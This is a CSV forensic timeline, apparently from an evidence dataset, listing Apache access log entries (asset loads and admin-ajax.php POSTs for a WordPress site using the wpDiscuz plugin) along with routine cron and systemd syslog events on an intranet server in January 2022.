date,time,timezone,MACB,source,sourcetype,type,user,host,short,desc,version,filename,inode,notes,format,extra
01/18/2022,12:58:14,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-includes/js/wp-emoji-release.min.js?ver=5.8.3 HTTP/1.1 from: 10.35.33...,http_request: GET /wp-includes/js/wp-emoji-release.min.js?ver=5.8.3 HTTP/1.1 from: 10.35.33.116 code: 200 referer: https://intranet.price.fox.org/?p=5 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 5331; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:58:15,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-content/plugins/wpdiscuz/assets/js/wpdiscuz-combo.min.js?ver=7.0.4 HT...,http_request: GET /wp-content/plugins/wpdiscuz/assets/js/wpdiscuz-combo.min.js?ver=7.0.4 HTTP/1.1 from: 10.35.33.116 code: 200 referer: https://intranet.price.fox.org/?p=5 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 71266; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:58:15,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-content/plugins/wpdiscuz/assets/third-party/font-awesome-5.13.0/webfo...,http_request: GET /wp-content/plugins/wpdiscuz/assets/third-party/font-awesome-5.13.0/webfonts/fa-brands-400.woff2 HTTP/1.1 from: 10.35.33.116 code: 200 referer: https://intranet.price.fox.org/wp-content/plugins/wpdiscuz/assets/third-party/font-awesome-5.13.0/css/fa.min.css?ver=7.0.4 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 76991; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:58:15,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-content/plugins/wpdiscuz/assets/third-party/font-awesome-5.13.0/webfo...,http_request: GET /wp-content/plugins/wpdiscuz/assets/third-party/font-awesome-5.13.0/webfonts/fa-regular-400.woff2 HTTP/1.1 from: 10.35.33.116 code: 200 referer: https://intranet.price.fox.org/wp-content/plugins/wpdiscuz/assets/third-party/font-awesome-5.13.0/css/fa.min.css?ver=7.0.4 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 13874; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:58:15,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-content/plugins/wpdiscuz/assets/third-party/font-awesome-5.13.0/webfo...,http_request: GET /wp-content/plugins/wpdiscuz/assets/third-party/font-awesome-5.13.0/webfonts/fa-solid-900.woff2 HTTP/1.1 from: 10.35.33.116 code: 200 referer: https://intranet.price.fox.org/wp-content/plugins/wpdiscuz/assets/third-party/font-awesome-5.13.0/css/fa.min.css?ver=7.0.4 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 79823; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:58:15,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-content/plugins/wpdiscuz/themes/default/css/fonts/sqr721c-webfont.wof...,http_request: GET /wp-content/plugins/wpdiscuz/themes/default/css/fonts/sqr721c-webfont.woff2 HTTP/1.1 from: 10.35.33.116 code: 200 referer: https://intranet.price.fox.org/wp-content/plugins/wpdiscuz/themes/default/style.css?ver=7.0.4 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 18908; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:58:15,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-content/themes/go/dist/js/frontend.min.js?ver=1.5.1 HTTP/1.1 from: 10...,http_request: GET /wp-content/themes/go/dist/js/frontend.min.js?ver=1.5.1 HTTP/1.1 from: 10.35.33.116 code: 200 referer: https://intranet.price.fox.org/?p=5 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 11687; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:58:15,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-includes/js/comment-reply.min.js?ver=5.8.3 HTTP/1.1 from: 10.35.33.116,http_request: GET /wp-includes/js/comment-reply.min.js?ver=5.8.3 HTTP/1.1 from: 10.35.33.116 code: 200 referer: https://intranet.price.fox.org/?p=5 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 1702; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:58:15,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-includes/js/wp-embed.min.js?ver=5.8.3 HTTP/1.1 from: 10.35.33.116,http_request: GET /wp-includes/js/wp-embed.min.js?ver=5.8.3 HTTP/1.1 from: 10.35.33.116 code: 200 referer: https://intranet.price.fox.org/?p=5 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 1120; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:58:37,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,OPTIONS * HTTP/1.0 from: ::1,http_request: OPTIONS * HTTP/1.0 from: ::1 code: 200 user_agent: Apache/2.4.29 (Ubuntu) OpenSSL/1.1.1 (internal dummy connection),2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 110; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:59:10,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-content/plugins/wpdiscuz/assets/img/loading.gif HTTP/1.1 from: 10.35....,http_request: GET /wp-content/plugins/wpdiscuz/assets/img/loading.gif HTTP/1.1 from: 10.35.33.144 code: 200 referer: https://intranet.price.fox.org/wp-content/plugins/wpdiscuz/themes/default/style.css?ver=7.0.4 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 4069; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:59:10,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,POST /wp-admin/admin-ajax.php HTTP/1.1 from: 10.35.33.144,http_request: POST /wp-admin/admin-ajax.php HTTP/1.1 from: 10.35.33.144 code: 200 referer: https://intranet.price.fox.org/?p=5 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 1225; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:59:45,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,POST /wp-admin/admin-ajax.php HTTP/1.1 from: 10.35.33.144,http_request: POST /wp-admin/admin-ajax.php HTTP/1.1 from: 10.35.33.144 code: 200 referer: https://intranet.price.fox.org/?p=5 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 537; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:59:45,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,POST /wp-admin/admin-ajax.php HTTP/1.1 from: 10.35.33.144,http_request: POST /wp-admin/admin-ajax.php HTTP/1.1 from: 10.35.33.144 code: 200 referer: https://intranet.price.fox.org/?p=5 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 5618; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,13:00:35,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-content/plugins/wpdiscuz/assets/img/loading.gif HTTP/1.1 from: 10.35....,http_request: GET /wp-content/plugins/wpdiscuz/assets/img/loading.gif HTTP/1.1 from: 10.35.33.116 code: 200 referer: https://intranet.price.fox.org/wp-content/plugins/wpdiscuz/themes/default/style.css?ver=7.0.4 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 4069; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,13:00:35,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,POST /wp-admin/admin-ajax.php HTTP/1.1 from: 10.35.33.116,http_request: POST /wp-admin/admin-ajax.php HTTP/1.1 from: 10.35.33.116 code: 200 referer: https://intranet.price.fox.org/?p=5 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 1225; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,13:00:48,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,POST /wp-admin/admin-ajax.php HTTP/1.1 from: 10.35.33.144,http_request: POST /wp-admin/admin-ajax.php HTTP/1.1 from: 10.35.33.144 code: 200 referer: https://intranet.price.fox.org/?p=5 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 537; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,13:00:48,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,POST /wp-admin/admin-ajax.php HTTP/1.1 from: 10.35.33.144,http_request: POST /wp-admin/admin-ajax.php HTTP/1.1 from: 10.35.33.144 code: 200 referer: https://intranet.price.fox.org/?p=5 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 5576; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,13:01:08,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,POST /wp-admin/admin-ajax.php HTTP/1.1 from: 10.35.33.116,http_request: POST /wp-admin/admin-ajax.php HTTP/1.1 from: 10.35.33.116 code: 200 referer: https://intranet.price.fox.org/?p=5 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 537; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,13:01:08,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,POST /wp-admin/admin-ajax.php HTTP/1.1 from: 10.35.33.116,http_request: POST /wp-admin/admin-ajax.php HTTP/1.1 from: 10.35.33.116 code: 200 referer: https://intranet.price.fox.org/?p=5 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 5587; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,13:01:43,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,POST /wp-admin/admin-ajax.php HTTP/1.1 from: 10.35.33.144,http_request: POST /wp-admin/admin-ajax.php HTTP/1.1 from: 10.35.33.144 code: 200 referer: https://intranet.price.fox.org/?p=5 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 537; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,13:01:43,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,POST /wp-admin/admin-ajax.php HTTP/1.1 from: 10.35.33.144,http_request: POST /wp-admin/admin-ajax.php HTTP/1.1 from: 10.35.33.144 code: 200 referer: https://intranet.price.fox.org/?p=5 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 5620; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,13:02:02,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,POST /wp-admin/admin-ajax.php HTTP/1.1 from: 10.35.33.116,http_request: POST /wp-admin/admin-ajax.php HTTP/1.1 from: 10.35.33.116 code: 200 referer: https://intranet.price.fox.org/?p=5 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 537; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,13:02:02,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,POST /wp-admin/admin-ajax.php HTTP/1.1 from: 10.35.33.116,http_request: POST /wp-admin/admin-ajax.php HTTP/1.1 from: 10.35.33.116 code: 200 referer: https://intranet.price.fox.org/?p=5 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 5647; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,13:02:03,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,POST /wp-admin/admin-ajax.php HTTP/1.1 from: 10.35.33.144,http_request: POST /wp-admin/admin-ajax.php HTTP/1.1 from: 10.35.33.144 code: 200 referer: https://intranet.price.fox.org/?p=5 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 1225; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,13:02:52,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,POST /wp-admin/admin-ajax.php HTTP/1.1 from: 10.35.33.144,http_request: POST /wp-admin/admin-ajax.php HTTP/1.1 from: 10.35.33.144 code: 200 referer: https://intranet.price.fox.org/?p=5 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 5720; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,13:02:53,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,POST /wp-admin/admin-ajax.php HTTP/1.1 from: 10.35.33.144,http_request: POST /wp-admin/admin-ajax.php HTTP/1.1 from: 10.35.33.144 code: 200 referer: https://intranet.price.fox.org/?p=5 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 537; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,13:03:13,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,POST /wp-admin/admin-ajax.php HTTP/1.1 from: 10.35.33.116,http_request: POST /wp-admin/admin-ajax.php HTTP/1.1 from: 10.35.33.116 code: 200 referer: https://intranet.price.fox.org/?p=5 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 537; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,13:03:13,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,POST /wp-admin/admin-ajax.php HTTP/1.1 from: 10.35.33.116,http_request: POST /wp-admin/admin-ajax.php HTTP/1.1 from: 10.35.33.116 code: 200 referer: https://intranet.price.fox.org/?p=5 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 5724; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,13:03:39,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET / HTTP/1.1 from: 10.35.33.116,http_request: GET / HTTP/1.1 from: 10.35.33.116 code: 200 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 6128; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,13:03:41,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,POST /wp-admin/admin-ajax.php HTTP/1.1 from: 10.35.33.144,http_request: POST /wp-admin/admin-ajax.php HTTP/1.1 from: 10.35.33.144 code: 200 referer: https://intranet.price.fox.org/?p=5 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 537; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,13:03:41,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,POST /wp-admin/admin-ajax.php HTTP/1.1 from: 10.35.33.144,http_request: POST /wp-admin/admin-ajax.php HTTP/1.1 from: 10.35.33.144 code: 200 referer: https://intranet.price.fox.org/?p=5 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 5443; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,13:09:01,UTC,M...,LOG,Log File,Content Modification Time,-,intranet-server,[CRON  pid: 28722] pam_unix(cron:session): session closed for user root,[CRON  pid: 28722] pam_unix(cron:session): session closed for user root,2,OS:D:\dataset\evidences\auth.log,-,-,text/syslog_traditional,sha256_hash: a487d742977818adc4796645f4c842477780cc42ab44b6faf440102ad5e205d2
01/18/2022,13:09:01,UTC,M...,LOG,Log File,Content Modification Time,-,intranet-server,[CRON  pid: 28722] pam_unix(cron:session): session opened for user root by (u...,[CRON  pid: 28722] pam_unix(cron:session): session opened for user root by (uid=0),2,OS:D:\dataset\evidences\auth.log,-,-,text/syslog_traditional,sha256_hash: a487d742977818adc4796645f4c842477780cc42ab44b6faf440102ad5e205d2
01/18/2022,13:09:01,UTC,M...,LOG,Cron log,Content Modification Time,root,intranet-server,(root) CMD (  [ -x /usr/lib/php/sessionclean ] && if [ ! -d /run/systemd/syst...,Cron ran: [ -x /usr/lib/php/sessionclean ] && if [ ! -d /run/systemd/system ]; then /usr/lib/php/sessionclean; fi for user: root pid: 28723,2,OS:D:\dataset\evidences\syslog,-,-,text/syslog_traditional,reporter: CRON; sha256_hash: 9ace5ff984bb2a2a8b0491d3a2a5aa7f7f134843d7693cdb4706c28dfedf5fe9
01/18/2022,13:09:23,UTC,M...,LOG,Log File,Content Modification Time,-,intranet-server,[systemd  pid: 1] Starting Clean php session files...,[systemd  pid: 1] Starting Clean php session files...,2,OS:D:\dataset\evidences\syslog,-,-,text/syslog_traditional,sha256_hash: 9ace5ff984bb2a2a8b0491d3a2a5aa7f7f134843d7693cdb4706c28dfedf5fe9
01/18/2022,13:09:24,UTC,M...,LOG,Log File,Content Modification Time,-,intranet-server,[systemd  pid: 1] Started Clean php session files.,[systemd  pid: 1] Started Clean php session files.,2,OS:D:\dataset\evidences\syslog,-,-,text/syslog_traditional,sha256_hash: 9ace5ff984bb2a2a8b0491d3a2a5aa7f7f134843d7693cdb4706c28dfedf5fe9
01/18/2022,13:09:45,UTC,M...,LOG,Log File,Content Modification Time,-,intranet-server,[systemd-timesyncd  pid: 4706] Network configuration changed  trying to estab...,[systemd-timesyncd  pid: 4706] Network configuration changed  trying to establish connection.,2,OS:D:\dataset\evidences\syslog,-,-,text/syslog_traditional,sha256_hash: 9ace5ff984bb2a2a8b0491d3a2a5aa7f7f134843d7693cdb4706c28dfedf5fe9
01/18/2022,13:09:45,UTC,M...,LOG,Log File,Content Modification Time,-,intranet-server,[systemd-networkd  pid: 4690] ens3: Configured,[systemd-networkd  pid: 4690] ens3: Configured,2,OS:D:\dataset\evidences\syslog,-,-,text/syslog_traditional,sha256_hash: 9ace5ff984bb2a2a8b0491d3a2a5aa7f7f134843d7693cdb4706c28dfedf5fe9
01/18/2022,13:09:46,UTC,M...,LOG,Log File,Content Modification Time,-,intranet-server,[systemd-timesyncd  pid: 4706] Synchronized to time server 91.189.91.157:123 ...,[systemd-timesyncd  pid: 4706] Synchronized to time server 91.189.91.157:123 (ntp.ubuntu.com).,2,OS:D:\dataset\evidences\syslog,-,-,text/syslog_traditional,sha256_hash: 9ace5ff984bb2a2a8b0491d3a2a5aa7f7f134843d7693cdb4706c28dfedf5fe9
01/18/2022,13:04:10,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET / HTTP/1.1 from: 10.35.33.144,http_request: GET / HTTP/1.1 from: 10.35.33.144 code: 200 user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML  like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 6128; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,13:13:28,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET / HTTP/1.1 from: 172.17.130.196,http_request: GET / HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 6128; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,13:13:29,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-content/themes/go/dist/css/design-styles/style-traditional.min.css?ve...,http_request: GET /wp-content/themes/go/dist/css/design-styles/style-traditional.min.css?ver=1.5.1 HTTP/1.1 from: 172.17.130.196 code: 200 referer: http://intranet.price.fox.org/ user_agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 1489; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,13:13:29,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-content/themes/go/dist/css/style-shared.min.css?ver=1.5.1 HTTP/1.1 fr...,http_request: GET /wp-content/themes/go/dist/css/style-shared.min.css?ver=1.5.1 HTTP/1.1 from: 172.17.130.196 code: 200 referer: http://intranet.price.fox.org/ user_agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 23189; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,13:13:29,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-content/themes/go/dist/js/frontend.min.js?ver=1.5.1 HTTP/1.1 from: 17...,http_request: GET /wp-content/themes/go/dist/js/frontend.min.js?ver=1.5.1 HTTP/1.1 from: 172.17.130.196 code: 200 referer: http://intranet.price.fox.org/ user_agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0,2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 11600; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
